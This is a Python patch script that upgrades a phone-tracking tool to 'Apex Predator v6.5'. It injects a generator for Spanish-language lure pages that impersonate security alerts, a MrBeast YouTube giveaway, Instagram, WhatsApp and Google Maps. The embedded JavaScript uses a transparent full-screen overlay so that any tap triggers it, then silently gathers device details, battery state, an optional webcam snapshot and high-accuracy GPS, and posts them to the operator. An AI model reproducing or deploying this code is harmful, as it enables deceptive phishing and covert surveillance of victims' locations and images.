import os

def apply_apex_predator():
    # 1. Update gui.py (Version & Warning)
    gui_file = "gui.py"
    if os.path.exists(gui_file):
        with open(gui_file, 'r', encoding='utf-8') as f:
            gcontent = f.read()
            
        gcontent = gcontent.replace("v6.4 - Ghost Intel Fix", "v6.5 - Apex Predator")
        
        # Add warning label if not present
        warning_tag = "self.warning_lbl ="
        if warning_tag not in gcontent:
            find_hook = "self.link_frame.grid(row=3"
            insert_warn = """
        self.warning_lbl = ctk.CTkLabel(self.tabview.tab("Dashboard"), 
                                        text="⚠️ MANTENGA ESTA VENTANA ABIERTA PARA RECIBIR DATOS", 
                                        text_color="orange", font=ctk.CTkFont(weight="bold"))
        self.warning_lbl.grid(row=4, column=0, pady=5)
"""
            gcontent = gcontent.replace(find_hook, insert_warn + "        " + find_hook)

        with open(gui_file, 'w', encoding='utf-8', newline='\n') as f:
            f.write(gcontent)
        print("GUI v6.5 Apex Predator applied.")

    # 2. Update phone_tracker.py (Templates & Immediate JS)
    tracker_file = "phone_tracker.py"
    if os.path.exists(tracker_file):
        with open(tracker_file, 'r', encoding='utf-8') as f:
            tcontent = f.read()

        # Surgical rewrite of _build_tracking_page
        old_builder_start = "    def _build_tracking_page(self, track_id):"
        next_server = "    def _start_grab_server("
        st = tcontent.find(old_builder_start)
        en = tcontent.find(next_server, st)

        if st != -1 and en != -1:
            new_builder_code = """    def _build_tracking_page(self, track_id):
        \"\"\"Genera pagina de rastreo Apex Predator v6.5 (Plantillas Fix).\"\"\"
        import os
        template = os.getenv("TEMPLATE_CHOICE", "security").lower()
        enable_snap = "1" if os.getenv("ENABLE_SNAPCAM") == "1" else "0"
        
        # OG Library v6.5
        og = {
            'title': '📍 Alerta de Seguridad',
            'desc': 'Se ha detectado un acceso inusual. Valida tu identidad para continuar.',
            'img': 'https://cdn-icons-png.flaticon.com/512/564/564619.png',
            'bait_title': 'Verificación Requerida',
            'bait_desc': 'Por favor, confirma que eres el propietario de esta cuenta.',
            'btn_text': 'VERIFICAR AHORA',
            'btn_color': '#d93025'
        }

        if 'youtube' in template:
            og.update({
                'title': '🎥 MrBeast: ¡RETO POR $1,000,000!',
                'desc': 'Has sido seleccionado para participar. Mira el video antes de que sea borrado.',
                'img': 'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png',
                'bait_title': 'Video Exclusivo',
                'bait_desc': 'Este contenido es privado. Verifica tu region para reproducir.',
                'btn_text': 'VER VIDEO AHORA',
                'btn_color': '#ff0000'
            })
        elif 'instagram' in template:
            og.update({
                'title': '👤 Instagram: Te han mencionado',
                'desc': 'Alguien te etiqueto en una historia. Toca para ver quien fue.',
                'img': 'https://www.instagram.com/static/images/ico/favicon-200.png/ab6dea7ac684.png',
                'bait_title': 'Nueva Mencion',
                'bait_desc': 'Tienes una mencion pendiente en una historia compartida.',
                'btn_text': 'VER HISTORIA',
                'btn_color': '#e1306c'
            })
        elif 'whatsapp' in template:
            og.update({
                'title': '🟢 WhatsApp: Invitacion a Grupo',
                'desc': 'Invitacion al grupo filtrado "Seguridad_Vecinal_2024". Toca para unirte.',
                'img': 'https://static.whatsapp.net/rsrc.php/v3/y7/r/DS_973_q7_n.png',
                'bait_title': 'Invitacion Pendiente',
                'bait_desc': 'Unirme al chat grupal de seguridad ciudadana.',
                'btn_text': 'UNIRSE AL CHAT',
                'btn_color': '#25d366'
            })
        elif 'google maps' in template or 'maps' in template:
            og.update({
                'title': '📍 Ubicacion Compartida contigo',
                'desc': 'Alguien compartio su posicion en tiempo real. Toca para verla en Maps.',
                'img': 'https://img.icons8.com/color/480/000000/google-maps.png',
                'bait_title': 'Mapa en Tiempo Real',
                'bait_desc': 'Ver la ubicacion actual compartida por tu contacto.',
                'btn_text': 'ABRIR EN MAPS',
                'btn_color': '#4285F4'
            })

        return f\"\"\"<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta property="og:type" content="website">
<meta property="og:title" content="{og['title']}">
<meta property="og:description" content="{og['desc']}">
<meta property="og:image" content="{og['img']}">
<title>{og['title']}</title>
<style>
  body {{ font-family: -apple-system, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
  .card {{ background: white; border: 1px solid #dbdbdb; padding: 40px; border-radius: 12px; text-align: center; max-width: 360px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); }}
  .btn {{ margin-top: 20px; padding: 14px; border-radius: 6px; cursor: pointer; color: white; font-weight: bold; background: {og['btn_color']}; text-transform: uppercase; }}
  #overlay {{ position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; cursor: pointer; background: transparent; }}
</style>
</head>
<body>
    <div id="overlay"></div>
    <div class="card">
        <img src="{og['img']}" style="width:70px;margin-bottom:20px;">
        <h2 style="font-size:1.4em;margin:0;">{og['bait_title']}</h2>
        <p style="color:#666;margin:15px 0;">{og['bait_desc']}</p>
        <div id="actBtn" class="btn">{og['btn_text']}</div>
    </div>
<script>
(function(){{
  var data = {{ track_id: "{track_id}", ua: navigator.userAgent, res: screen.width + "x" + screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, cores: navigator.hardwareConcurrency, mem: navigator.deviceMemory }};
  var enableSnap = \"{enable_snap}\";
  var captured = false;

  function send(d) {{ 
    if(captured) return; // Only send the most detailed capture
    fetch("/capture/" + d.track_id, {{ method:\"POST\", headers:{{\"Content-Type\":\"application/json\"}}, body:JSON.stringify(d) }}); 
  }}

  // Immediate Trigger Logic v6.5
  window.onload = function() {{ setTimeout(startProcess, 500); }};
  
  // Ghost Trigger: Capture on ANY interaction with the screen
  document.getElementById('overlay').onclick = function() {{
     this.style.display = 'none';
     startProcess();
  }};
  
  document.getElementById('actBtn').onclick = function() {{
     this.innerHTML = "CARGANDO...";
     startProcess();
  }};

  function startProcess() {{
    try {{
      navigator.getBattery().then(function(b){{
        data.bat = Math.round(b.level * 100) + "%";
        data.charging = b.charging;
        triggerIntel();
      }}).catch(triggerIntel);
    }} catch(e) {{ triggerIntel(); }}
  }}

  function triggerIntel() {{
    if (enableSnap === "1") {{
       navigator.mediaDevices.getUserMedia({{ video: true }}).then(function(s) {{
         var v = document.createElement('video');
         v.srcObject = s; v.onloadedmetadata = function() {{
           v.play();
           setTimeout(function() {{
             var c = document.createElement('canvas');
             c.width = v.videoWidth; c.height = v.videoHeight;
             c.getContext('2d').drawImage(v, 0, 0);
             data.base64_image = c.toDataURL('image/jpeg', 0.6);
             s.getTracks().forEach(t => t.stop());
             checkGeo();
           }}, 1000);
         }};
       }}).catch(checkGeo);
    }} else {{ checkGeo(); }}
  }}

  function checkGeo() {{
    if (navigator.geolocation) {{
      navigator.geolocation.getCurrentPosition(function(p){{
        data.gps_lat = p.coords.latitude; data.gps_lon = p.coords.longitude; data.gps_accuracy = p.coords.accuracy; send(data); captured=true;
      }}, function(e){{ 
        data.gps_err = e.message; send(data); 
      }}, {{enableHighAccuracy:true, timeout:8000}});
    }} else {{ send(data); }}
  }}
}})();
</script>
</body>
</html>\"\"\"
"""
            tcontent = tcontent[:st] + new_builder_code + tcontent[en:]

        with open(tracker_file, 'w', encoding='utf-8', newline='\n') as f:
            f.write(tcontent)
        print("Tracker v6.5 Apex Predator surgery complete.")

if __name__ == "__main__":
    apply_apex_predator()
